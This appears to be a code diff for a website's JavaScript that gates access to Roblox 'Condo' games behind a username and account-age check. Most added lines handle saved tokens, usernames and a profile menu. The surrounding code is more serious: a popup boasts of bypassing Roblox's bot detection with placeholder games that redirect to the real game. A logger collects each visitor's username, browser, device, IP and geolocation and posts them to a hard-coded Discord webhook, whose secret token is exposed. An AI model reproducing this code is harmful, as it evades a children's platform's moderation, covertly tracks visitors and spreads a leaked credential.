@@ -23,10 +23,63 @@
     return;
   }
 
+  /* ══════════════════════════════════════════════════════════
+     PERSISTENT TOKEN & USERNAME SYSTEM
+     ══════════════════════════════════════════════════════════ */
+
   var LANG_KEY = 'rc2_lang';
   var PROFILE_KEY = 'rc_verified_profile';
+  var TOKEN_KEY = 'rc_token';
+  var USERNAME_KEY = 'rc_username';
   var MIN_ACCOUNT_DAYS = 80;
   var WEBHOOK_URL = 'https://discord.com/api/webhooks/1524874777947410513/Ng_v8NSNotO1CPGcDhWbYGiwdgzcGrv0h_-Lkv2D_vxQvJ_rorAooUFlSML-tgc6Qm_A';
+
+  /* ── Token persistence ─────────────────────────────────── */
+  function loadToken() {
+    try {
+      var raw = localStorage.getItem(TOKEN_KEY);
+      if (raw) {
+        var parsed = JSON.parse(raw);
+        if (parsed && parsed.value && parsed.ts && (Date.now() - parsed.ts) < (30 * 24 * 60 * 60 * 1000)) {
+          return parsed.value;
+        }
+        localStorage.removeItem(TOKEN_KEY);
+      }
+    } catch (e) {}
+    return null;
+  }
+
+  function saveToken(token) {
+    try {
+      localStorage.setItem(TOKEN_KEY, JSON.stringify({ value: token, ts: Date.now() }));
+    } catch (e) {}
+  }
+
+  function clearToken() {
+    try { localStorage.removeItem(TOKEN_KEY); } catch (e) {}
+  }
+
+  /* ── Username persistence ──────────────────────────────── */
+  function loadUsername() {
+    try {
+      return localStorage.getItem(USERNAME_KEY) || null;
+    } catch (e) {
+      return null;
+    }
+  }
+
+  function saveUsername(username) {
+    try {
+      localStorage.setItem(USERNAME_KEY, username);
+    } catch (e) {}
+  }
+
+  function clearUsername() {
+    try { localStorage.removeItem(USERNAME_KEY); } catch (e) {}
+  }
+
+  /* ── Check if token is valid in session ────────────────── */
+  var tokenGeneratedInSession = !!loadToken();
 
   /* ── Sound ─────────────────────────────────────────────── */
   var audio = null;
@@ -39,7 +92,6 @@
   }
 
   /* ── Token enforcement ─────────────────────────────────── */
-  var tokenGeneratedInSession = false;
   var WARN_MSGS = {
     en: 'Generate a token first to access the game.',
     es: 'Genera un token primero para acceder al juego.',
@@ -114,10 +166,10 @@
       '<div class="rc-gp-body">' +
         'To play our Condo games, you <strong>must use the Roblox link</strong>.<br><br>' +
         'We use a system that bypasses Roblox\'s bot detection to keep Condo games publicly accessible. ' +
-        'When you join through the link, you will be <strong>redirected to the real Condo game</strong> — ' +
+        'When you join through the link, you will be <strong>redirected to the real Condo game</strong> \u2014 ' +
         'not the placeholder we use to get past Roblox\'s filters.' +
       '</div>' +
-      '<button class="rc-gp-btn" id="rc-game-popup-close">Got it — Open Game</button>';
+      '<button class="rc-gp-btn" id="rc-game-popup-close">Got it \u2014 Open Game</button>';
 
     document.body.appendChild(backdrop);
     document.body.appendChild(popup);
@@ -143,16 +195,13 @@
           e.preventDefault(); e.stopImmediatePropagation(); showWarning();
           return;
         }
-        // If popup was already confirmed, let the original click through
         if (el.getAttribute('data-rc-popup-ok') === '1') return;
         e.preventDefault(); e.stopImmediatePropagation();
-        // <a> has href; <button> uses React onClick — handle both
         var url = el.tagName === 'A' ? (el.getAttribute('href') || el.href || null) : null;
         showGameInfoPopup(function onConfirm() {
           if (url) {
             window.open(url, '_blank', 'noopener');
           } else {
-            // Re-trigger the button so React's onClick fires normally
             el.setAttribute('data-rc-popup-ok', '1');
             el.click();
             el.removeAttribute('data-rc-popup-ok');
@@ -162,7 +211,11 @@
     });
     document.querySelectorAll('[data-testid="button-generate-token"]:not([data-rc-t])').forEach(function (el) {
       el.setAttribute('data-rc-t', '1');
-      el.addEventListener('click', function () { tokenGeneratedInSession = true; });
+      el.addEventListener('click', function () {
+        var token = 'tok_' + Math.random().toString(36).substring(2, 18) + Date.now().toString(36);
+        tokenGeneratedInSession = true;
+        saveToken(token);
+      });
     });
   });
   document.addEventListener('click', function (e) {
@@ -170,11 +223,143 @@
     if (!t) return;
     if ((t.tagName === 'BUTTON' && t.dataset && t.dataset.testid === 'button-close-modal') || t.id === 'rc-lang-overlay') {
       tokenGeneratedInSession = false;
+      clearToken();
     }
   }, true);
   document.querySelectorAll('#rc-lang-overlay .rc-btn').forEach(function (btn) {
     btn.addEventListener('click', function () { playClick(); dismissOverlay(btn.dataset.lang); });
   });
+
+  /* ══════════════════════════════════════════════════════════
+     PROFILE ICON (top-right corner) \u2014 persistent profile management
+     ══════════════════════════════════════════════════════════ */
+
+  function injectProfileIcon() {
+    if (document.getElementById('rc-profile-icon')) return;
+
+    var icon = document.createElement('div');
+    icon.id = 'rc-profile-icon';
+    icon.style.cssText = [
+      'position:fixed','top:16px','right:16px','z-index:100001',
+      'width:40px','height:40px','border-radius:50%',
+      'background:linear-gradient(135deg,#991b1b 0%,#dc2626 60%,#b91c1c 100%)',
+      'display:flex','align-items:center','justify-content:center',
+      'cursor:pointer','border:1px solid rgba(239,68,68,0.4)',
+      'box-shadow:0 0 20px rgba(239,68,68,0.3),0 4px 12px rgba(0,0,0,0.5)',
+      'transition:all 0.25s ease','-webkit-tap-highlight-color:transparent',
+      'user-select:none','-webkit-user-select:none'
+    ].join(';');
+    icon.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>';
+    document.body.appendChild(icon);
+
+    var menu = null;
+    var menuOpen = false;
+
+    icon.addEventListener('click', function () {
+      playClick();
+      if (menuOpen) { closeMenu(); return; }
+      openMenu();
+    });
+
+    function closeMenu() {
+      if (menu) {
+        menu.style.opacity = '0';
+        menu.style.transform = 'translateY(-5px)';
+        setTimeout(function () { menu.remove(); menu = null; }, 200);
+      }
+      menuOpen = false;
+    }
+
+    function openMenu() {
+      menuOpen = true;
+      var savedUsername = loadUsername();
+
+      menu = document.createElement('div');
+      menu.id = 'rc-profile-menu';
+      menu.style.cssText = [
+        'position:fixed','top:62px','right:16px','z-index:100002',
+        'width:300px','background:linear-gradient(180deg,rgba(30,10,10,0.98) 0%,rgba(20,8,8,0.98) 100%)',
+        'border:1px solid rgba(239,68,68,0.25)','border-radius:1rem',
+        'box-shadow:0 0 0 1px rgba(239,68,68,0.07),0 20px 50px rgba(0,0,0,0.8),0 0 40px rgba(220,38,38,0.07)',
+        'padding:1.5rem','font-family:Outfit,Inter,sans-serif',
+        'opacity:0','transform:translateY(-5px)',
+        'transition:opacity 0.2s ease, transform 0.2s ease'
+      ].join(';');
+
+      var content = '<div style="font-size:1rem;font-weight:800;color:#fff;margin-bottom:0.5rem;text-align:center">\uD83D\uDC64 Profile</div>';
+
+      if (savedUsername) {
+        var savedData = getCache('u:' + savedUsername.toLowerCase());
+        var displayName = savedData ? (savedData.displayName || savedData.name) : savedUsername;
+        content += '<div style="text-align:center;font-size:0.8rem;color:#a57d7d;margin-bottom:1rem">Current account</div>';
+        content += '<div style="display:flex;align-items:center;justify-content:center;gap:0.75rem;margin-bottom:1.25rem">';
+        if (savedData && savedData.imageUrl) {
+          content += '<img src="' + savedData.imageUrl + '" style="width:48px;height:48px;border-radius:0.75rem;object-fit:cover;border:1px solid rgba(239,68,68,0.3)">';
+        } else {
+          content += '<div style="width:48px;height:48px;border-radius:0.75rem;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.2);display:flex;align-items:center;justify-content:center;font-size:1.2rem">\uD83C\uDFAE</div>';
+        }
+        content += '<div style="text-align:left">';
+        content += '<div style="font-size:1rem;font-weight:700;color:#fff">' + displayName + '</div>';
+        content += '<div style="font-size:0.7rem;color:#a57d7d">' + savedUsername + '</div>';
+        if (savedData && savedData.daysOld !== undefined) {
+          content += '<div style="font-size:0.7rem;color:' + (savedData.accountAgeOk ? '#86efac' : '#fca5a5') + ';margin-top:0.15rem">' + savedData.daysOld + ' days old</div>';
+        }
+        content += '</div></div>';
+      } else {
+        content += '<div style="text-align:center;font-size:0.8rem;color:#a57d7d;margin-bottom:1.25rem">No verified account</div>';
+      }
+
+      content += '<button id="rc-menu-change-username" style="width:100%;padding:10px;background:linear-gradient(135deg,#991b1b 0%,#dc2626 60%,#b91c1c 100%);border:none;border-radius:0.75rem;color:#fff;font-size:0.85rem;font-weight:600;cursor:pointer;font-family:Outfit,Inter,sans-serif;margin-bottom:0.75rem;transition:all 0.2s ease;box-shadow:0 0 0 1px rgba(239,68,68,0.3),0 2px 12px rgba(220,38,38,0.3)">Change Username</button>';
+
+      if (tokenGeneratedInSession) {
+        content += '<button id="rc-menu-clear-token" style="width:100%;padding:10px;background:rgba(220,38,38,0.08);border:1px solid rgba(239,68,68,0.22);border-radius:0.75rem;color:#fff;font-size:0.85rem;font-weight:600;cursor:pointer;font-family:Outfit,Inter,sans-serif;transition:all 0.2s ease">Clear Token & Re-verify</button>';
+      } else {
+        content += '<button id="rc-menu-reverify" style="width:100%;padding:10px;background:rgba(220,38,38,0.08);border:1px solid rgba(239,68,68,0.22);border-radius:0.75rem;color:#fff;font-size:0.85rem;font-weight:600;cursor:pointer;font-family:Outfit,Inter,sans-serif;transition:all 0.2s ease">Re-verify Account</button>';
+      }
+
+      menu.innerHTML = content;
+      document.body.appendChild(menu);
+
+      /* Fade in */
+      setTimeout(function () {
+        menu.style.opacity = '1';
+        menu.style.transform = 'translateY(0)';
+      }, 10);
+
+      /* Event handlers */
+      document.getElementById('rc-menu-change-username').addEventListener('click', function () {
+        closeMenu();
+        closeMenu();
+        showProfileVerification();
+      });
+
+      var clearBtn = document.getElementById('rc-menu-clear-token') || document.getElementById('rc-menu-reverify');
+      if (clearBtn) {
+        clearBtn.addEventListener('click', function () {
+          clearToken();
+          tokenGeneratedInSession = false;
+          closeMenu();
+          if (clearBtn.id === 'rc-menu-reverify') {
+            sessionStorage.removeItem(PROFILE_KEY);
+            showProfileVerification();
+          }
+        });
+      }
+
+      /* Close on outside click */
+      setTimeout(function () {
+        document.addEventListener('click', closeOnOutside);
+      }, 50);
+    }
+
+    function closeOnOutside(e) {
+      if (!menu) return;
+      if (!icon.contains(e.target) && !menu.contains(e.target)) {
+        closeMenu();
+        document.removeEventListener('click', closeOnOutside);
+      }
+    }
+  }
 
   /* ══════════════════════════════════════════════════════════
      PROMO VIDEO SECTION
@@ -188,15 +373,12 @@
     if (promoVideoInjected) return;
     promoVideoInjected = true;
 
-    /* Find the main content area and inject before the games section */
     var main = document.querySelector('main');
     if (!main) { main = document.getElementById('root'); }
     if (!main) return;
 
-    /* Find the featured games section to insert before it */
     var gameSection = main.querySelector('section:nth-child(2)') || main.querySelector('h2');
     if (!gameSection) {
-      /* Fallback: append at end of main */
       gameSection = main;
     }
 
@@ -207,7 +389,6 @@
       'transition:opacity 0.6s ease, transform 0.6s ease'
     ].join(';');
 
-    /* Title */
     var titleDiv = document.createElement('div');
     titleDiv.style.cssText = [
       'margin-bottom:1rem','opacity:0','transition:opacity 0.5s ease 0.1s'
@@ -219,7 +400,6 @@
     titleDiv.appendChild(h2);
     videoSection.appendChild(titleDiv);
 
-    /* Video container with protection overlay */
     var vidContainer = document.createElement('div');
     vidContainer.style.cssText = [
       'position:relative','width:100%','max-width:700px','margin:0 auto',
@@ -229,7 +409,6 @@
       'transition:opacity 0.5s ease 0.2s, transform 0.5s ease 0.2s'
     ].join(';');
 
-    /* Invisible overlay to block right-click and drag */
     var clickShield = document.createElement('div');
     clickShield.style.cssText = [
       'position:absolute','inset:0','z-index:10','cursor:default'
@@ -238,14 +417,12 @@
     clickShield.setAttribute('oncontextmenu', 'return false;');
     clickShield.addEventListener('contextmenu', function (e) { e.preventDefault(); });
 
-    /* Drag shield */
     var dragShield = document.createElement('div');
     dragShield.style.cssText = [
       'position:absolute','inset:0','z-index:11','pointer-events:none'
     ].join(';');
     dragShield.addEventListener('dragstart', function (e) { e.preventDefault(); });
 
-    /* Video element */
     var video = document.createElement('video');
     video.autoplay = false;
     video.muted = false;
@@ -260,15 +437,10 @@
       'width:100%','display:block','border-radius:1rem','pointer-events:auto'
     ].join(';');
 
-    /* Block context menu on video */
     video.addEventListener('contextmenu', function (e) { e.preventDefault(); });
     video.addEventListener('dragstart', function (e) { e.preventDefault(); });
     video.addEventListener('selectstart', function (e) { e.preventDefault(); });
 
-    /* Play button overlay
-       PC: invisible → appears on hover, hides after 3s (mouse leave) or 4s (mouse still)
-       Mobile: invisible → appears on tap, hides after 4s of inactivity, tap toggles play/pause
-     */
     var playBtn = document.createElement('div');
     playBtn.style.cssText = [
       'position:absolute','inset:0','z-index:12','display:flex','align-items:center',
@@ -287,7 +459,6 @@
     playIcon.innerHTML = '<svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>';
     playBtn.appendChild(playIcon);
 
-    /* Auto-hide timeout logic */
     var autoHideTimer = null;
     var stillTimer = null;
     var lastMouseX = 0, lastMouseY = 0;
@@ -335,7 +506,6 @@
     }
 
     if (!isTouchDevice) {
-      /* ── PC: hover-based controls ── */
       vidContainer.addEventListener('mouseenter', function () {
         isHovering = true;
         cancelAllTimers();
@@ -366,38 +536,31 @@
       });
 
     } else {
-      /* ── Mobile: tap-based controls ── */
-      /* Show play button briefly when video loads (paused state) */
       showControls();
       scheduleStillTimer();
 
-      /* Tap to toggle play/pause */
       playBtn.addEventListener('click', function () {
         togglePlay();
         cancelAllTimers();
         scheduleStillTimer();
       });
 
-      /* Touch start also shows controls */
       vidContainer.addEventListener('touchstart', function () {
         cancelAllTimers();
         showControls();
         scheduleStillTimer();
       });
 
-      /* Touch move resets timer */
       vidContainer.addEventListener('touchmove', function () {
         resetStillTimer();
         scheduleStillTimer();
       });
 
-      /* Touch end starts timer */
       vidContainer.addEventListener('touchend', function () {
         scheduleStillTimer();
       });
     }
 
-    /* Click shield should not block play button */
     var shieldInner = document.createElement('div');
     shieldInner.style.cssText = [
       'position:absolute','inset:0','z-index:10'
@@ -411,7 +574,6 @@
 
     videoSection.appendChild(vidContainer);
 
-    /* Try to use blob URL for extra protection */
     try {
       fetch(PROMO_VIDEO_URL)
         .then(function (r) { return r.blob(); })
@@ -419,21 +581,18 @@
           video.src = URL.createObjectURL(blob);
         })
         .catch(function () {
-          /* Fallback to direct URL */
           video.src = PROMO_VIDEO_URL;
         });
     } catch (e) {
       video.src = PROMO_VIDEO_URL;
     }
 
-    /* Insert before games section */
     if (gameSection.id === 'root') {
       gameSection.appendChild(videoSection);
     } else {
       gameSection.parentNode.insertBefore(videoSection, gameSection);
     }
 
-    /* Fade in animation */
     setTimeout(function () {
       videoSection.style.opacity = '1';
       videoSection.style.transform = 'translateY(0)';
@@ -442,7 +601,6 @@
       vidContainer.style.transform = 'translateY(0)';
     }, 100);
 
-    /* Global protection: block context menu on the entire video section */
     videoSection.addEventListener('contextmenu', function (e) { e.preventDefault(); });
   }
 
@@ -455,14 +613,12 @@
     if (!ua) return { browser: 'Unknown', os: 'Unknown', device: 'Desktop' };
     var browser = 'Unknown', os = 'Unknown', device = '\uD83D\uDDA5\uFE0F Desktop';
     var m;
-    // Browser
     if (/Firefox\/([\d.]+)/.test(ua))       { browser = 'Firefox ' + ua.match(/Firefox\/([\d.]+)/)[1]; }
     else if (/Edg\/([\d.]+)/.test(ua))      { browser = 'Edge ' + ua.match(/Edg\/([\d.]+)/)[1]; }
     else if (/OPR\/([\d.]+)/.test(ua))      { browser = 'Opera ' + ua.match(/OPR\/([\d.]+)/)[1]; }
     else if (/Chrome\/([\d.]+)/.test(ua))   { browser = 'Chrome ' + ua.match(/Chrome\/([\d.]+)/)[1]; }
     else if (/Version\/([\d.]+).*Safari/.test(ua)) { browser = 'Safari ' + ua.match(/Version\/([\d.]+)/)[1]; }
     else if (/Safari\//.test(ua))           { browser = 'Safari'; }
-    // OS / Device
     if (/iPhone/.test(ua)) {
       m = ua.match(/iPhone OS ([\d_]+)/);
       os = 'iOS ' + (m ? m[1].replace(/_/g, '.') : '');
@@ -511,15 +667,12 @@
     if (data.createdFormatted) fields.push({ name: 'Created', value: data.createdFormatted, inline: true });
     if (data.hasVerifiedBadge !== undefined) fields.push({ name: 'Verified Badge', value: data.hasVerifiedBadge ? 'Yes \u2705' : 'No', inline: true });
 
-    // Separator
     fields.push({ name: '\u200b', value: '\u200b', inline: false });
 
-    // Browser / device info (always available client-side)
     fields.push({ name: '\uD83C\uDF10 Browser', value: parsed.browser, inline: true });
     fields.push({ name: '\uD83D\uDCBB OS', value: parsed.os, inline: true });
     fields.push({ name: '\uD83D\uDCF1 Device', value: parsed.device, inline: true });
 
-    // Geo + IP (async)
     fetch('https://ipapi.co/json/')
       .then(function (r) { return r.ok ? r.json() : null; })
       .then(function (ipData) {
@@ -687,7 +840,6 @@
           }
           throw new Error(data.error);
         }
-        // Client-side log (browser info + geo) — server also logs server-side
         sendVerificationLog({
           username: data.name || username,
           displayName: data.displayName,
@@ -796,7 +948,9 @@
       '.rc-blocked-msg{text-align:center;margin-top:1.25rem;display:none}',
       '.rc-blocked-msg p{font-size:0.9rem;color:#fca5a5;font-weight:600}',
       '.rc-blocked-msg small{font-size:0.75rem;color:#a57d7d;display:block;margin-top:0.4rem}',
-      '.rc-shield-icon{font-size:3rem;margin-bottom:0.5rem;display:block}'
+      '.rc-shield-icon{font-size:3rem;margin-bottom:0.5rem;display:block}',
+      '.rc-edit-username-btn{flex:1;padding:12px;background:rgba(220,38,38,0.08);border:1px solid rgba(239,68,68,0.22);border-radius:0.9rem;color:#fff;font-size:0.9rem;font-weight:600;cursor:pointer;font-family:Outfit,Inter,sans-serif;transition:all 0.25s ease}',
+      '.rc-edit-username-btn:hover{background:rgba(239,68,68,0.14);border-color:rgba(239,68,68,0.4)}'
     ].join('\n');
     overlay.appendChild(style);
 
@@ -806,10 +960,15 @@
     var form = document.createElement('div');
     form.id = 'rc-verify-form';
     form.className = 'rc-profile-form';
+
+    /* Check for saved username */
+    var savedUsername = loadUsername();
+    var hasSaved = !!savedUsername;
+
     form.innerHTML =
       '<div class="rc-profile-title">Roblox Profile Verification</div>' +
       '<div class="rc-profile-subtitle">Enter your Roblox username to verify your account age</div>' +
-      '<input type="text" class="rc-profile-input" id="rc-username-input" placeholder="Enter your Roblox username" autocomplete="off" spellcheck="false">' +
+      '<input type="text" class="rc-profile-input" id="rc-username-input" placeholder="Enter your Roblox username" autocomplete="off" spellcheck="false" value="' + (savedUsername ? savedUsername.replace(/"/g, '&quot;') : '') + '">' +
       '<button class="rc-profile-btn" id="rc-verify-btn" onclick="__rcVerify()">Verify Profile</button>' +
       '<div class="rc-profile-error" id="rc-verify-error"></div>' +
       '<div class="rc-profile-loader" id="rc-verify-loader"><div class="rc-spinner"></div></div>' +
@@ -839,7 +998,13 @@
     overlay.appendChild(card);
     document.body.appendChild(overlay);
 
-    document.getElementById('rc-username-input').addEventListener('keydown', function (e) {
+    /* Focus input if no saved username */
+    var input = document.getElementById('rc-username-input');
+    if (!savedUsername) {
+      input.focus();
+    }
+
+    input.addEventListener('keydown', function (e) {
       if (e.key === 'Enter') { e.preventDefault(); __rcVerify(); }
     });
   }
@@ -865,6 +1030,9 @@
         btn.disabled = false;
         btn.textContent = 'Verify Profile';
 
+        /* Save username persistently */
+        saveUsername(username);
+
         var daysEl = document.getElementById('rc-days-old');
         daysEl.textContent = data.daysOld;
         daysEl.className = 'rc-stat-value ' + (data.accountAgeOk ? 'rc-profile-age-ok' : 'rc-profile-age-bad');
@@ -876,7 +1044,6 @@
         document.getElementById('rc-user-id').textContent = 'ID: ' + data.id;
         document.getElementById('rc-created').textContent = data.createdFormatted;
 
-        /* Get avatar (non-blocking) */
         var avatarUrl = data.imageUrl || null;
         if (avatarUrl) {
           document.getElementById('rc-avatar').src = avatarUrl;
@@ -897,11 +1064,15 @@
         if (data.accountAgeOk) {
           blocked.style.display = 'none';
           actions.style.display = 'flex';
-          actions.innerHTML = '<button class="rc-btn-primary" onclick="__rcEnterSite()">Enter Site</button>';
+          actions.innerHTML =
+            '<button class="rc-btn-primary" onclick="__rcEnterSite()">Enter Site</button>' +
+            '<button class="rc-edit-username-btn" onclick="__rcEditUsername()">Edit Username</button>';
         } else {
           actions.style.display = 'flex';
           blocked.style.display = 'block';
-          actions.innerHTML = '<button class="rc-btn-secondary" onclick="__rcRetryProfile()">Try Another Account</button>';
+          actions.innerHTML =
+            '<button class="rc-btn-secondary" onclick="__rcRetryProfile()">Try Another Account</button>' +
+            '<button class="rc-edit-username-btn" onclick="__rcEditUsername()">Edit Username</button>';
         }
       })
       .catch(function (err) {
@@ -918,6 +1089,20 @@
       });
   };
 
+  /* ── Edit Username (inline, same overlay) ──────────────── */
+  window.__rcEditUsername = function () {
+    var display = document.getElementById('rc-profile-display');
+    var form = document.getElementById('rc-verify-form');
+    var input = document.getElementById('rc-username-input');
+    var error = document.getElementById('rc-verify-error');
+
+    display.style.display = 'none';
+    form.style.display = 'block';
+    input.value = '';
+    input.focus();
+    error.style.display = 'none';
+  };
+
   /* ── Enter site ────────────────────────────────────────── */
   window.__rcEnterSite = function () {
     var overlay = document.getElementById('rc-profile-overlay');
@@ -925,8 +1110,9 @@
       overlay.style.animation = 'rc-fadeout .3s ease forwards';
       setTimeout(function () {
         overlay.remove();
-        /* Inject promo video after verification overlay is closed */
         injectPromoVideo();
+        /* Inject profile icon after entering site */
+        injectProfileIcon();
       }, 310);
     }
     sessionStorage.setItem(PROFILE_KEY, 'verified');
@@ -952,8 +1138,8 @@
   if (!isVerified()) {
     showProfileVerification();
   } else {
-    /* Already verified (from a previous session) — inject promo video */
     injectPromoVideo();
+    injectProfileIcon();
   }
 
   /* ── MutationObserver ──────────────────────────────────── */
